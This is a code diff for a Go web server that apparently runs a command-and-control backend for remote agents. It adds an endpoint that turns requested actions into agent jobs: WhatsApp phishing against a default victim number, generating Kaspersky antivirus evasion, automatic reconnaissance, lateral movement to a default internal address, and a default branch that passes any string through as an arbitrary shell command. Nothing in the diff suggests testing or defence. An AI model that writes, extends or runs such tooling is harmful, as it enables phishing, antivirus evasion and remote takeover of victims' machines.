@@ -186,15 +186,16 @@ func DeleteReport(c *gin.Context) {
 }
 
 type AgentBeaconRequest struct {
-	AgentID  string   `json:"agent_id" binding:"required"`
-	Hostname string   `json:"hostname" binding:"required"`
-	Username string   `json:"username"`
-	OS       string   `json:"os"`
-	Arch     string   `json:"arch"`
-	Tags     []string `json:"tags"`
-	Zone     string   `json:"zone"`
-	Profile  string   `json:"profile"`
-	Status   string   `json:"status"`
+	AgentID       string            `json:"agent_id" binding:"required"`
+	Hostname      string            `json:"hostname" binding:"required"`
+	Username      string            `json:"username"`
+	OS            string            `json:"os"`
+	Arch          string            `json:"arch"`
+	BeaconHeaders map[string]string `json:"beacon_headers"`
+	Tags          []string          `json:"tags"`
+	Zone          string            `json:"zone"`
+	Profile       string            `json:"profile"`
+	Status        string            `json:"status"`
 }
 
 type AgentJobRequest struct {
@@ -207,6 +208,11 @@ type AgentJobResultRequest struct {
 	ExitCode int    `json:"exit_code"`
 	Stdout   string `json:"stdout"`
 	Stderr   string `json:"stderr"`
+}
+
+type AgentActionRequest struct {
+	Action string            `json:"action" binding:"required"`
+	Params map[string]string `json:"params"`
 }
 
 func GetStatistics(c *gin.Context) {
@@ -226,17 +232,18 @@ func BeaconAgent(c *gin.Context) {
 	}
 
 	agent := &reporting.Agent{
-		AgentID:     req.AgentID,
-		Hostname:    req.Hostname,
-		Username:    req.Username,
-		OS:          req.OS,
-		Arch:        req.Arch,
-		Status:      req.Status,
-		Tags:        req.Tags,
-		Zone:        req.Zone,
-		Profile:     req.Profile,
-		BeaconCount: 1,
-		LastSeen:    time.Now(),
+		AgentID:       req.AgentID,
+		Hostname:      req.Hostname,
+		Username:      req.Username,
+		OS:            req.OS,
+		Arch:          req.Arch,
+		BeaconHeaders: req.BeaconHeaders,
+		Status:        req.Status,
+		Tags:          req.Tags,
+		Zone:          req.Zone,
+		Profile:       req.Profile,
+		BeaconCount:   1,
+		LastSeen:      time.Now(),
 	}
 
 	stored, err := storage.SaveAgent(agent)
@@ -267,6 +274,65 @@ func GetAgent(c *gin.Context) {
 		return
 	}
 	c.JSON(http.StatusOK, agent)
+}
+
+func ExecuteAgentAction(c *gin.Context) {
+	agentID := c.Param("id")
+	var req AgentActionRequest
+	if err := c.ShouldBindJSON(&req); err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
+		return
+	}
+
+	_, err := storage.GetAgent(agentID)
+	if err != nil {
+		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
+		return
+	}
+
+	command, args := mapAgentActionToCommand(req.Action, req.Params)
+	job := &reporting.AgentJob{
+		AgentID:    agentID,
+		Command:    command,
+		Args:       args,
+		TimeoutSec: 900,
+	}
+
+	stored, err := storage.SaveJob(job)
+	if err != nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
+		return
+	}
+
+	c.JSON(http.StatusOK, gin.H{"job": stored})
+}
+
+func mapAgentActionToCommand(action string, params map[string]string) (string, []string) {
+	switch action {
+	case "phish-whatsapp":
+		victim := params["target"]
+		if victim == "" {
+			victim = "+5491123456789"
+		}
+		return "phish-whatsapp", []string{victim}
+	case "generate-evasion-kaspersky":
+		return "generate", []string{"--evasion", "kaspersky"}
+	case "recon-auto":
+		return "recon", []string{"--auto"}
+	case "lateral-move":
+		target := params["target"]
+		if target == "" {
+			target = "10.0.0.55"
+		}
+		return "lateral-move", []string{target}
+	default:
+		// ejecucion de shell arbitraria
+		shell := params["cmd"]
+		if shell == "" {
+			shell = action
+		}
+		return shell, nil
+	}
 }
 
 func CreateAgentJob(c *gin.Context) {
@@ -337,6 +403,17 @@ func SubmitJobResult(c *gin.Context) {
 	// TODO: map job output to report findings insights
 
 	c.JSON(http.StatusOK, gin.H{"result": storedResult})
+}
+
+func GetJobResults(c *gin.Context) {
+	jobID := c.Param("id")
+	results, err := storage.GetJobResults(jobID)
+	if err != nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
+		return
+	}
+
+	c.JSON(http.StatusOK, gin.H{"results": results})
 }
 
 func Health(c *gin.Context) {
